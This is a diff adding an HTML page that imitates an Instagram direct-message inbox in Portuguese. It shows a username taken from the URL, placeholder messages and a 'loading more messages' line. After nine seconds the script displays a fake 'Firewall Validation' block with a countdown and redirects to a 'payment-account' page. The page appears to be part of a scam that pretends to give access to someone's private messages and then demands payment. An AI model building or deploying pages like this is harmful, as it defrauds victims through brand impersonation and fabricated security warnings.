@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            gap: 15px;
+        }
+
+        .header .username {
+            font-size: 22px;
+            font-weight: bold;
+            flex-grow: 1;
+        }
+
+        .header i {
+            font-size: 24px;
+        }
+
+        /* Search Bar */
+        .search-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 15px;
+            background: #1c1c1c;
+            border-radius: 10px;
+            margin: 10px 15px;
+        }
+
+        .search-bar i {
+            color: #8e8e8e;
+        }
+
+        .search-bar span {
+            color: #8e8e8e;
+        }
+
+        /* Notes */
+        .notes {
+            display: flex;
+            gap: 20px;
+            padding: 15px;
+        }
+
+        .note-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .note-circle {
+            width: 66px;
+            height: 66px;
+            border-radius: 50%;
+            background: #363636;
+        }
+
+        .note-label {
+            width: 50px;
+            height: 10px;
+            background: #363636;
+            border-radius: 5px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            padding: 0 15px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            background: #262626;
+            color: #a8a8a8;
+        }
+
+        .tab.active {
+            background: #fff;
+            color: #000;
+        }
+
+        /* Messages */
+        .messages-list {
+            padding: 0 15px;
+        }
+
+        .message-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .message-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #363636;
+        }
+
+        .message-details {
+            flex-grow: 1;
+        }
+
+        .message-line {
+            height: 12px;
+            background: #363636;
+            border-radius: 6px;
+            margin-bottom: 8px;
+        }
+
+        .message-line.short {
+            width: 60%;
+        }
+
+        .message-item i {
+            font-size: 24px;
+            color: #a8a8a8;
+        }
+        
+        /* Loading More */
+        .loading-more {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        /* Firewall Error */
+        #firewall-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            text-align: center;
+        }
+
+        #firewall-overlay h2 {
+            color: #ff4d4d;
+            font-size: 24px;
+        }
+
+        #firewall-overlay p {
+            font-size: 16px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-arrow-left"></i>
+            <span id="username-display" class="username"></span>
+            <i class="far fa-edit" style="margin-left:auto; margin-right: 15px"></i>
+        </div>
+
+        <div class="search-bar">
+            <i class="fas fa-search"></i>
+            <span>Pergunte à Meta AI ou pesquise</span>
+        </div>
+
+        <div class="notes">
+            <div class="note-item">
+                <div class="note-circle"></div>
+                <div class="note-label"></div>
+            </div>
+             <div class="note-item">
+                <div class="note-circle"></div>
+                <div class="note-label"></div>
+            </div>
+             <div class="note-item">
+                <div class="note-circle"></div>
+                <div class="note-label"></div>
+            </div>
+             <div class="note-item">
+                <div class="note-circle"></div>
+                <div class="note-label"></div>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active">Principal</div>
+            <div class="tab">Geral</div>
+            <div class="tab">Canais</div>
+            <div class="tab">Solicitações</div>
+        </div>
+
+        <div class="messages-list">
+            <div class="message-item">
+                <div class="message-avatar"></div>
+                <div class="message-details">
+                    <div class="message-line"></div>
+                    <div class="message-line short"></div>
+                </div>
+                <i class="far fa-camera"></i>
+            </div>
+            <div class="message-item">
+                <div class="message-avatar"></div>
+                <div class="message-details">
+                    <div class="message-line"></div>
+                    <div class="message-line short"></div>
+                </div>
+                <i class="far fa-camera"></i>
+            </div>
+            <div class="message-item">
+                <div class="message-avatar"></div>
+                <div class="message-details">
+                    <div class="message-line"></div>
+                    <div class="message-line short"></div>
+                </div>
+                <i class="far fa-camera"></i>
+            </div>
+        </div>
+
+        <div class="loading-more">
+            Acessando mais mensagens...
+        </div>
+
+    </div>
+    
+    <div id="firewall-overlay">
+        <h2>Firewall Validation</h2>
+        <p>Acesso bloqueado. Redirecionando em <span id="countdown">5</span> segundos...</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const username = urlParams.get('username') || 'usuário';
+        document.getElementById('username-display').textContent = username;
+
+        setTimeout(() => {
+            const firewallOverlay = document.getElementById('firewall-overlay');
+            firewallOverlay.style.display = 'flex';
+
+            let countdownValue = 5;
+            const countdownElement = document.getElementById('countdown');
+
+            const countdownInterval = setInterval(() => {
+                countdownValue--;
+                countdownElement.textContent = countdownValue;
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                     window.location.href = `../payment-account/?username=${username}`;
+                }
+            }, 1000);
+
+        }, 9000); // 9 segundos
+    </script>
+
+</body>
+</html>
